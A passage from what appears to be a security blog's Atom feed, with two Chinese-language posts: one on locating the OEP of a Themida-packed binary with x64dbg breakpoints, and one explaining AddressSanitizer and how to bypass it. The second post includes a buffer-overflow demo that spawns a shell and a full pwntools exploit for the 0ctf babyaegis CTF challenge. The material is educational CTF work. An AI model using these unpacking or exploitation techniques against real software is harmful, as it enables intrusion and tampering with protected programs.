    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间，干一个活的时候遇到了一个强壳 Themida，简称 TMD 壳。搜了一下资料</p><p>这个壳的特点就是会在关键代码处采用 vmp 保护，如 vmp 保护程序入口。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505001531.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505001531.png"></a></p><p>好在我遇到的这个壳没有对 oep 进行处理。所以还是比较好找到 oep的。</p><h1 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h1><p>脱壳过程中找 oep 是一个关键的的步骤，找 oep 有许多的方法，但是其实大都对 TMD 这种强壳没有什么帮助？（可能是我脱的壳比较少）。另外还有一种常见的方法，就是找关键 api 然后回溯，找到真正的入口，下硬件断点。</p><p>我遇到的这个程序是 msvcrt 编写的程序。</p><p>我们知道在 MSVC 中程序编译器会为全局和静态函数生成相应的初始化器，并把他们的地址放在一个表（table）中，这个表会在 _cinit() 初始化 CRT 的时候生成。在 PE 结构中，这个表通常在 .data 段的起始位置。<br>从 Entry Point 到 main 函数过程中，在完成了_setargv() 以及_setenvp() 之后，进入到_cinit 函数。<br>_cinit 函数很短，大致上分为三个步骤：</p><ol><li><p>_fpmath() 或者 (*_FPinit)();</p></li><li><p>_initterm( __xi_a, __xi_z );</p></li><li><p>_initterm( __xc_a, __xc_z );</p></li></ol><p>第一步 是可选的，_FPinit 主要用来初始化浮点运算。只有当用户写的代码中出现了浮点运算，_FPinit 才会被定义。<br>第二步和第三步 是分别对C和C++程序做初始化。_initterm 接受两个指针作为参数，这两个指针中间的内存区域是一张函数指针表。_initterm 会从第一个指针开始，慢慢向后寻找，直到第二个指针结束，中间如果找到了一块内存表示一个函数指针，则执行该函数。</p><p>关键的地方就是在程序需会走到  <code>msvcrt._initterm</code> ，所以我们可以对这个位置下条件断点。</p><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><p>首先找到自己要的关键模块，找到模块的区段地址。<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505002653.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505002653.png"></a></p><p>然后下好 条件断点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp msvcrt._initterm</span><br><span class="line">bpcnd msvcrt._initterm, [esp]&lt; 0xd2d000+0x1000</span><br></pre></td></tr></table></figure><h2 id="寻找-oep"><a href="#寻找-oep" class="headerlink" title="寻找 oep"></a>寻找 oep</h2><p>执行，程序到达断点。<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003110.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003110.png"></a></p><p>此时程序到达断点，发现此时程序来到了 esp 符合条件的位置。 而此时的 esp 存储的地址就是 oep 附近，我们只需来到 esp 存maty储地址附近，往上回溯即可。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003232.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003232.png"></a></p><h1 id="题外"><a href="#题外" class="headerlink" title="题外"></a>题外</h1><p>在用x64dbg 脱壳的过程中遇到了很强烈的反调试，然后我尝试用了<a href="https://github.com/x64dbg/ScyllaHide">ScyllaHide</a>这个插件解决了。</p><p>另外感谢 pizza 对我的帮助。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="revrse" scheme="https://bestwing.me/tags/revrse/"/>
    
    <category term="unpack" scheme="https://bestwing.me/tags/unpack/"/>
    
  </entry>
  
  <entry>
    <title>ASan and ASan in CTF(0ctf babyaegis)</title>
    <link href="https://bestwing.me/ASan-and-ASan-in-CTF(0ctf-babyaegis).html"/>
    <id>https://bestwing.me/ASan-and-ASan-in-CTF(0ctf-babyaegis).html</id>
    <published>2019-03-22T16:00:00.000Z</published>
    <updated>2020-03-04T05:37:22.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="About-AddressSanitizer-ASan"><a href="#About-AddressSanitizer-ASan" class="headerlink" title="About AddressSanitizer(ASan)"></a>About AddressSanitizer(ASan)</h1><p>AddressSanitizer 后文均简称为ASan 是 Google 开源的一个用于进行内存检测的工具，包括但可能不限于 Heap buffer overflow, Stack buffer overflow, Global buffer overflow 等等。</p><p>在 wiki 中就举了了四个例子，分别是</p><ol><li>Heap-use-after-free</li><li>Heap-buffer-overflow</li><li>Stack-buffer-overflow</li><li>Global-buffer-overflow</li></ol><p>除了学术上的建树，这个工具也曾发现了不少漏洞，如在知名的 j00r 的<a href="https://j00ru.vexillium.org/2014/01/ffmpeg-and-the-tale-of-a-thousand-fixes/">blog</a> 中提到的</p><p>关于 ASan 的核心实现在 wiki 也提到了，在我读了一些 paper 以及在 0ctf babyaegis 这个题目的调试也大概总结了一下：</p><h2 id="ASan-算法实现"><a href="#ASan-算法实现" class="headerlink" title="ASan 算法实现"></a>ASan 算法实现</h2><p>ASan 由两个主要部分构成，插桩和动态运行库( Run-time library )，插桩主要是针对在llvm编译器级别对访问内存的操作(store，load，alloca等)，将它们进行处理。动态运行库主要提供一些运行时的复杂的功能(比如poison/unpoison shadow memory)以及将malloc,free等系统调用函数hook住。其实该算法的思路很简单，如果想防住Buffer Overflow漏洞，只需要在每块内存区域右端（或两端，能防overflow和underflow）加一块区域（RedZone），使RedZone的区域的影子内存（Shadow Memory)设置为不可写即可。</p><p>+——————-+<br>|     redzone          |<br>+——————-+<br>|       mem              |<br>+——————-+<br>|     redzone          |<br>+——————-+<br>|       mem              |<br>+——————-+<br>|     redzone          |<br>+——————-+</p><h3 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h3><p>AddressSanitizer保护的主要原理是对程序中的虚拟内存提供粗粒度的影子内存(没8个字节的内存对应一个字节的影子内存)，为了减少overhead，就采用了直接内存映射策略，所采用的具体策略如下：Shadow=(Mem &gt;&gt; 3) + offset。每8个字节的内存对应一个字节的影子内存，影子内存中每个字节存取一个数字k,如果k=0，则表示该影子内存对应的8个字节的内存都能访问。<br>如果k在0到7之间,表示前k个字节可以访问，如果k为负数，不同的数字表示不同的错误（e.g. Stack buffer overflow, Heap buffer overflow)。具体的映射策略如下图所示。</p><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shadow &#x3D; (Mem &gt;&gt; 3) + 0x7fff8000;</span><br></pre></td></tr></table></figure><table><thead><tr><th>[0x10007fff8000, 0x7fffffffffff]</th><th>HighMem</th></tr></thead><tbody><tr><td>[0x02008fff7000, 0x10007fff7fff]</td><td>HighShadow</td></tr><tr><td>[0x00008fff7000, 0x02008fff6fff]</td><td>ShadowGap</td></tr><tr><td>[0x00007fff8000, 0x00008fff6fff]</td><td>LowShadow</td></tr><tr><td>[0x000000000000, 0x00007fff7fff]</td><td>LowMem</td></tr></tbody></table><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shadow &#x3D; (Mem &gt;&gt; 3) + 0x20000000;</span><br></pre></td></tr></table></figure><table><thead><tr><th>[0x40000000, 0xffffffff]</th><th>HighMem</th></tr></thead><tbody><tr><td>[0x28000000, 0x3fffffff]</td><td>HighShadow</td></tr><tr><td>[0x24000000, 0x27ffffff]</td><td>ShadowGap</td></tr><tr><td>[0x20000000, 0x23ffffff]</td><td>LowShadow</td></tr><tr><td>[0x00000000, 0x1fffffff]</td><td>LowMem</td></tr></tbody></table><h1 id="Bypassing-AddressSanitizer"><a href="#Bypassing-AddressSanitizer" class="headerlink" title="Bypassing AddressSanitizer"></a>Bypassing AddressSanitizer</h1><p>显而易见的是，ASan 的检查很大一部分是基于影子内存中，此时影子内存的flag值。假设如果全段影子内存的 flag 全为0，我们就可以完全无视掉ASan，而0ctf 的 babyaegis，正是给了一个写0的机会，给了我们一次对一个指针再次读写的机会。</p><p>此外还有几种方法，比如</p><h3 id="Adjacent-Buffers-in-the-Same-Struct-Class"><a href="#Adjacent-Buffers-in-the-Same-Struct-Class" class="headerlink" title="Adjacent Buffers in the Same Struct/Class"></a>Adjacent Buffers in the Same Struct/Class</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ cat test1.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Test()&#123;</span><br><span class="line"> command[<span class="number">0</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line"> command[<span class="number">1</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line"> command[<span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line"> system(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> command[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"> Test aTest = Test();</span><br><span class="line"> aTest.a();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ localhost in /tmp [1:42:48]</span></span><br><span class="line">$ g++ -O -g -fsanitize=address test1.c</span><br><span class="line">clang: warning: treating <span class="string">&#x27;c&#x27;</span> input as <span class="string">&#x27;c++&#x27;</span> when <span class="keyword">in</span> C++ mode, this behavior is deprecated [-Wdeprecated]</span><br><span class="line"></span><br><span class="line"><span class="comment"># swing @ localhost in /tmp [1:43:10]</span></span><br><span class="line">$ ./a.out</span><br><span class="line">aaaaaaaaaa/bin/sh;</span><br><span class="line">sh-3.2$ id</span><br><span class="line">uid=501(swing) gid=20(staff) groups=20(staff),701(com.apple.sharepoint.group.1),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),501(access_bpf),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh-disabled)</span><br><span class="line">sh-3.2$</span><br></pre></td></tr></table></figure><p>剩下见 PDF：</p><div class="row">    <embed src="https://dl.packetstormsecurity.net/papers/general/BreakingAddressSanitizer.pdf" width="100%" height="550" type="application/pdf"></div><h1 id="0ctf-babyaegis"><a href="#0ctf-babyaegis" class="headerlink" title="0ctf babyaegis"></a>0ctf babyaegis</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@linuxkit-025000000001 /pwn<span class="comment"># checksec aegis</span></span><br><span class="line">[*] <span class="string">&#x27;/pwn/aegis&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br><span class="line">    ASAN:     Enabled</span><br><span class="line">    UBSAN:    Enabled   </span><br></pre></td></tr></table></figure><p>   开了 ASan </p><p>  影子内存位置： mem &gt;&gt; 3) + 0x7FFF8000LL</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>在update中：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023314.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023314.png"></a></p><p>在delete中</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023349.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023349.png"></a></p><p>存在uaf</p><p>此外，存在一个后门函数为：secret函数</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023617.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023617.png"></a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>可以先置checker为0使得我们可以进行一个堆溢出改size值为0，接下来在做一次更改，这次可以溢出更多，改size为更大的值。然后rm了这个堆块再malloc出来就可以造成一个uaf的效果。接着利用uaf的指针泄漏各种program base 和libc base什么的东西。然后利用指针去改写bss段上的值导致__sanitizer::Die()函数内部call rax 调用我们想调用的函数。这里本来是想调用onegadget，但是不明确也没深究为什么onegadget没起作用。之后此处改写为gets控制程序流然后构成栈溢出覆盖ret为onegadget接着就getshell了</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;notiterm&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;iterm&#x27;</span>,<span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;notiterm&#x27;, &#x27;-t&#x27;, &#x27;iterm&#x27;, &#x27;-p&#x27;, &#x27;15112&#x27;, &#x27;-e&#x27;] # use 50806 port as an example</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;./aegis&#x27;</span>)</span><br><span class="line">    <span class="comment"># p=process(&#x27;./aegis&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;111.186.63.209&#x27;</span>,<span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pu</span>(<span class="params">x</span>):</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pu_enter</span>(<span class="params">x</span>):</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">sz,content,id</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Size&#x27;</span>)</span><br><span class="line">    pu_enter(str(sz))</span><br><span class="line">    get(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">    pu(content)</span><br><span class="line">    get(<span class="string">&#x27;ID&#x27;</span>)</span><br><span class="line">    pu_enter(str(id))</span><br><span class="line">    get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx,content,id</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    pu(content)</span><br><span class="line">    get(<span class="string">&#x27;New ID:&#x27;</span>)</span><br><span class="line">    pu_enter(str(id))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span>(<span class="params">addr</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Lucky Number: &#x27;</span>)</span><br><span class="line">    pu_enter(str(addr))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0x123456789abcdef</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>,<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x602000000000</span></span><br><span class="line"><span class="comment">#0x7fff8000</span></span><br><span class="line">secret(<span class="number">0xc047fff8008</span><span class="number">-4</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x12</span>,<span class="number">0x123456789</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x02ffffff00000002</span>)[:<span class="number">7</span>],<span class="number">0x01f000ff1002ff</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#raw_input(&quot;#&quot;)</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x602000000018</span>),<span class="number">0</span>)</span><br><span class="line"><span class="comment">#raw_input(&quot;#&quot;)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">addr = u64(get(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> addr</span><br><span class="line">pbase = addr <span class="number">-0x114AB0</span></span><br><span class="line">get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">5</span>,p64(pbase+<span class="number">0x347DF0</span>)[:<span class="number">2</span>],(pbase+<span class="number">0x347DF0</span>)&gt;&gt;<span class="number">8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">addr = u64(get(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">base = addr <span class="number">-0xE4FA0</span></span><br><span class="line">get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">5</span>,p64(pbase+<span class="number">0x0FB08A0</span>),p64(pbase+<span class="number">0x7AE140</span>))</span><br><span class="line"><span class="comment">#update(5,p64(pbase+0xfb08a0+0x28),(pbase+0xfb08a0+0x28)&gt;&gt;8)</span></span><br><span class="line">raw_input(<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">pu_enter(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">pu_enter(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">get(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line"><span class="comment">#raw_input(hex(pbase+0x7AE140))</span></span><br><span class="line">pu(p64(base+<span class="number">524464</span>)[:<span class="number">7</span>])</span><br><span class="line"><span class="comment">#get(&#x27;ID&#x27;)</span></span><br><span class="line">raw_input(<span class="string">&quot;#get&quot;</span>+str(hex(pbase+<span class="number">0x7AE140</span>)))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">471</span>+p64(base+<span class="number">0x4f322</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x100</span></span><br><span class="line"><span class="comment">#raw_input(hex(base + 0x4f322))</span></span><br><span class="line">pu_enter(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(lbase))</span></span><br><span class="line"><span class="comment">#print(hex(stack))</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm">github-AddressSanitizer</a></p><p><a href="https://www.usenix.org/system/files/conference/atc12/atc12-final39.pdf">AddressSanitizer: A Fast Address Sanity Checker</a></p><p><a href="https://blog.csdn.net/pang241/article/details/76137969">AddressSanitizer算法及源码解析</a></p><p><a href="https://blog.csdn.net/pang241/article/details/76137969">Bypassing AddressSanitizer</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Other" scheme="https://bestwing.me/categories/Other/"/>
    
    
    <category term="Asan" scheme="https://bestwing.me/tags/Asan/"/>
    
  </entry>
  
</feed>
